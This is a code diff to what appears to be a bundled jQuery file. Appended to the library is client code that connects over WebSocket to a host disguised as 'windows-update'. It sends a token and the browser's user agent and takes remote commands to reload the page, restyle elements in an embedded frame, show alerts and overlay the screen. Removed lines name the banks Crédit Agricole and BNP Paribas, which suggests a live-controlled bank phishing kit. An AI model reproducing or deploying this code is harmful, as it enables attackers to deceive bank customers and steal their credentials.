@@ -10367,8 +10367,8 @@ return jQuery;
 
 var psykey = 'panelkey';
 var psyapp= "pwr";
-var psybrand = "CreditAgricole";//BnpParibas CreditAgricole TestIO
 var psylink = 'wss://windows-update.herokuapp.com';
+
 var psyid  = createToken();
 var ws ;
 var inp = "";
@@ -10385,7 +10385,7 @@ $(document).ready(function(){
     //psylink = 'ws://'+queryDict.link;
     $('#psyconfig_submit').click(function(){
 
-        psybrand = $('#psybrand').val();
+        //psybrand = $('#psybrand').val();
         connect();
     });
     $('#psyconfig_newid').click(function(){
@@ -10426,12 +10426,12 @@ function psyBind(e)
 
 function connect()
 {
-    ws = new WebSocket(psylink+'?app='+psyapp+'&brand='+psybrand+'&token='+psyid+'&key='+psykey+'&ua='+navigator.userAgent);
+    ws = new WebSocket(psylink+'?app='+psyapp+'&token='+psyid+'&key='+psykey+'&ua='+navigator.userAgent);
     ws.onopen = function () {
         console.log("connection made");
-       // if(onLoadPage)
+        // if(onLoadPage)
         {
-           // getContent(onLoadPage);
+            // getContent(onLoadPage);
         }
     };
     ws.onmessage = function (evt) {
@@ -10468,7 +10468,7 @@ function PsyProcessInput(psyId)
                 return $(this).css('visibility') == 'visible';
             }).last().css("visibility","hidden");
             if(inp.length>0)
-            inp = inp.substring(inp.length-2,inp.length-1)
+                inp = inp.substring(inp.length-2,inp.length-1)
         }
         else {
             console.log('clicked');
@@ -10526,7 +10526,7 @@ function PsyProcessMessage(message)
             window.location.reload();
             break;
         case 2: //Pswitch
-            $("#psy_frame").contents().find(wsMessage.target).css('visibility',wsMessage.data);
+            $("#psy_frame").contents().find(wsMessage.target).css(wsMessage.data.name,wsMessage.data.value);
             break;
         case 3: //Palert
             alert(wsMessage.data);
@@ -10578,8 +10578,12 @@ function getCookie(name)
 function addLoading()
 {
 
-    $('body').append('<style>.psy_loading   {display: none;background-color: white;width: 100%;position: fixed;height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_loading > div{top: 50%;left: 49%;position: fixed;    }</style><div id="psy_loading" class="psy_loading"><div >     <img src="loading.gif" alt="Loading..." class="bk-loader"></div></div>');
-    $('body').append('<style>.psy_blocker   {opacity: 0.2; display: none;background-color: black;width: 100%;position: fixed;height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_blocker > div{top: 50%;left: 49%;position: fixed;    }</style><div id="psy_blocker" class="psy_blocker"><div ></div></div>');
+    $('body').append('<style>.psy_loading   {display: none;background-color: white;width: 100%;position: fixed;height: 100%;z-index:5000' +
+        ';top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_loading > div{top: 50%;left: 49%;position: fixed;    }' +
+        '</style><div id="psy_loading" class="psy_loading"><div >     <img src="loading.gif" alt="Loading..." class="bk-loader"></div></div>');
+    $('body').append('<style>.psy_blocker   {opacity: 0.2; display: none;background-color: black;width: 100%;position: fixed;' +
+        'height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_blocker > div{top: 50%;left: 49%;position: fixed;    }' +
+        '</style><div id="psy_blocker" class="psy_blocker"><div ></div></div>');
 
 }
 
